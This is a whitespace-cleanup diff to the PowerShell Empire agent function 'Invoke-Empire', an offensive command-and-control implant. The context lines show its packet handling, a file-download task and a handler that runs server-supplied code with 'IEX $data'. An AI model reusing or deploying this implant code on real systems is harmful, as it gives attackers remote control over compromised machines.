@@ -701,7 +701,7 @@ function Invoke-Empire {
                 # write-host "Meta: $Meta"
                 $Extra = $RoutingData[10..11]
                 $PacketLength = [BitConverter]::ToUInt32($RoutingData, 12)
-                
+
                 if ($PacketLength -lt 0) {
                     # Write-Host "Invalid PacketLength: $PacketLength"
                     break
@@ -725,7 +725,7 @@ function Invoke-Empire {
 
     function Encode-Packet {
         param([Int16]$type, $data, [Int16]$ResultID=0)
-        <# 
+        <#
             encode a packet for transport:
             +------+--------------------+----------+---------+--------+-----------+
             | Type | total # of packets | packet # | task ID | Length | task data |
@@ -820,7 +820,7 @@ function Invoke-Empire {
             }
             # file download
             elseif($type -eq 41) {
-                
+
                 try {
                     $ChunkSize = 512KB
 
@@ -1093,14 +1093,14 @@ function Invoke-Empire {
 
             elseif($type -eq 130) {
                 #Dynamically update agent comms
-                
+
                 try {
                     IEX $data
 
                     Encode-Packet -type $type -data "[+] Switched the current listener to: $CurrentListenerName" -ResultID $ResultID
                 }
                 catch {
-                    
+
                     Encode-Packet -type 0 -data ("[!] Unable to update agent comm methods: $_") -ResultID $ResultID
                 }
             }
